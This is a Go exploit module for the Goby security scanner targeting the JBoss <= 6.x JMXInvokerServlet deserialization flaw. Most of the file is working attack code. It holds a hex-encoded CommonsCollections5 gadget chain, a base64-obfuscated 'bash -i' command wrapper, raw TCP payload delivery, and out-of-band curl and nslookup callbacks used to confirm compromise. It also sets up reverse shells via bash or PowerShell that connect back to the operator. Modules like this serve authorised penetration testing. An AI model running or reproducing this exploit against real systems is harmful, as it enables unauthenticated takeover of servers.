package exploits

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "JBoss <= 6.x JMXInvokerServlet Unauthenticated Java Deserialization rce Vulnerability",
    "Description": "<p>Red Hat JBoss Enterprise Application Platform (EAP) is a set of open source, J2EE-based middleware platform of Red Hat (Red Hat). The platform is primarily used for building, deploying and hosting Java applications and services. Jboss Application Server is one of the open source application servers based on JavaEE.</p><p>A remote code execution vulnerability exists in the Jboss Application Server shipped with Red Hat Jboss versions &lt; 6.x. A remote attacker could exploit the vulnerability to execute arbitrary code in the context of an affected application with specially crafted serialized data.</p>",
    "Impact": "<p>JBoss &lt;= 6.x Unauthenticated Java Deserialization rce</p>",
    "Recommendation": "<p>1. Update to jboss 7 or above. Official link: <a href=\"https://www.redhat.com\">https://www.redhat.com</a></p>",
    "Product": "RedHat-JBoss-AS",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "JBoss <= 6.x JMXInvokerServlet 接口反序列化远程代码执行漏洞",
            "Product": "RedHat-JBoss-AS",
            "Description": "<p>Red Hat JBoss Enterprise Application Platform（EAP）是美国红帽（Red Hat）公司的一套开源、基于J2EE的中间件平台。该平台主要用于构建、部署和托管Java应用程序与服务。Jboss Application Server是其中的一款基于JavaEE的开源的应用服务器。</p><p>Red Hat Jboss 小于6.x版本中附带的Jboss Application Server存在远程代码执行漏洞。远程攻击者可借助特制的序列化数据利用该漏洞在受影响应用程序上下文中执行任意代码。</p>",
            "Recommendation": "<p>1、更新至jboss 7或以上版本。<br>官方链接：<a href=\"https://www.redhat.com\">https://www.redhat.com</a></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "JBoss <= 6.x JMXInvokerServlet Unauthenticated Java Deserialization rce Vulnerability",
            "Product": "RedHat-JBoss-AS",
            "Description": "<p>Red Hat JBoss Enterprise Application Platform (EAP) is a set of open source, J2EE-based middleware platform of Red Hat (Red Hat). The platform is primarily used for building, deploying and hosting Java applications and services. Jboss Application Server is one of the open source application servers based on JavaEE.</p><p>A remote code execution vulnerability exists in the Jboss Application Server shipped with Red Hat Jboss versions &lt; 6.x. A remote attacker could exploit the vulnerability to execute arbitrary code in the context of an affected application with specially crafted serialized data.</p>",
            "Recommendation": "<p>1. Update to jboss 7 or above<br>. Official link: <a href=\"https://www.redhat.com\">https://www.redhat.com</a></p>",
            "Impact": "<p>JBoss &lt;= 6.x Unauthenticated Java Deserialization rce</p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "banner==\"\\xac\\xed\\x00\\x05\"",
    "GobyQuery": "banner==\"\\xac\\xed\\x00\\x05\"",
    "Author": "sharecast.net@gmail.com",
    "Homepage": "https://www.redhat.com/",
    "DisclosureDate": "2022-04-21",
    "References": [
        "https://jspin.re/jboss-eap-as-6-rce-a-little-bit-beyond-xac-xed/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "createSelect",
            "value": "goby_shell_linux,goby_shell_win",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10359"
}`

	genCommonsCollections5 := func(cmd string) []byte {
		payloadStart := "aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000037372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000005174002679736f73657269616c2e7061796c6f6164732e436f6d6d6f6e73436f6c6c656374696f6e7335740018436f6d6d6f6e73436f6c6c656374696f6e73352e6a6176617400096765744f626a6563747371007e000b0000003371007e000d71007e000e71007e000f7371007e000b0000002274001979736f73657269616c2e47656e65726174655061796c6f616474001447656e65726174655061796c6f61642e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e001a78737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b657971007e00014c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00017870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d6571007e00055b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e003200000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00327371007e002b7571007e002f00000002707571007e002f00000000740006696e766f6b657571007e003200000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e002f7371007e002b757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174"
		payload2Len := fmt.Sprintf("%04x", len(cmd))
		payload2 := hex.EncodeToString([]byte(cmd))
		payloadEnd := "740004657865637571007e00320000000171007e00377371007e0027737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000000770800000010000000007878"
		payload := strings.Join([]string{payloadStart, payload2Len, payload2, payloadEnd}, "")
		payloadStr, _ := hex.DecodeString(payload)
		return payloadStr
	}
	ofbBashBase64CMD := func(cmd string) string {
		cmdBase64 := base64.StdEncoding.EncodeToString([]byte(cmd))
		cmdStr := fmt.Sprintf(`bash -c {echo,%s}|{base64,-d}|{bash,-i}`, cmdBase64)
		return cmdStr
	}
	doCheck := func(ip string, cmd string, checkStr string) bool {
		serHeader := "aced0005"
		buf := make([]byte, 1024)
		serByte, _ := hex.DecodeString(serHeader)
		cc5 := hex.EncodeToString(genCommonsCollections5(cmd))
		cc5 = strings.Replace(cc5, serHeader, "77011679", 1)
		cc5Payload, _ := hex.DecodeString(cc5)
		conn, _ := httpclient.GetTCPConn(ip, time.Second*5)
		defer conn.Close()
		for {
			conn.Write(serByte)
			conn.Read(buf)
			if strings.Contains(hex.EncodeToString(buf), serHeader) {
				conn.Write(cc5Payload)
				return godclient.PullExists(checkStr, time.Second*5)
			}
			break
		}
		return false
	}
	doRun := func(ip string, cmd string) {
		serHeader := "aced0005"
		buf := make([]byte, 1024)
		serByte, _ := hex.DecodeString(serHeader)
		cc5 := hex.EncodeToString(genCommonsCollections5(cmd))
		cc5 = strings.Replace(cc5, serHeader, "77011679", 1)
		cc5Payload, _ := hex.DecodeString(cc5)
		conn, _ := httpclient.GetTCPConn(ip, time.Second*5)
		defer conn.Close()
		for {
			conn.Write(serByte)
			conn.Read(buf)
			if strings.Contains(hex.EncodeToString(buf), serHeader) {
				conn.Write(cc5Payload)
			}
			break
		}
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(6)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			ip := fmt.Sprintf("%s:%s", u.IP, u.Port)
			cmd := fmt.Sprintf("curl %s", checkUrl)
			cmdWin := fmt.Sprintf("nslookup %s", checkUrl)
			if doCheck(ip, ofbBashBase64CMD(cmd), checkStr) {
				return true
			}
			if doCheck(ip, cmdWin, checkStr) {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			ip := fmt.Sprintf("%s:%s", expResult.HostInfo.IP, expResult.HostInfo.Port)
			if ss.Params["AttackType"].(string) == "goby_shell_linux" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					cmd := godclient.ReverseTCPByBash(rp)
					go doRun(ip, ofbBashBase64CMD(cmd))
					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 10):
					}
				}
			}
			if ss.Params["AttackType"].(string) == "goby_shell_win" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					cmd := godclient.ReverseTCPByPowershell(rp)
					go doRun(ip, cmd)
					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 10):
					}
				}
			}
			return expResult
		},
	))
}
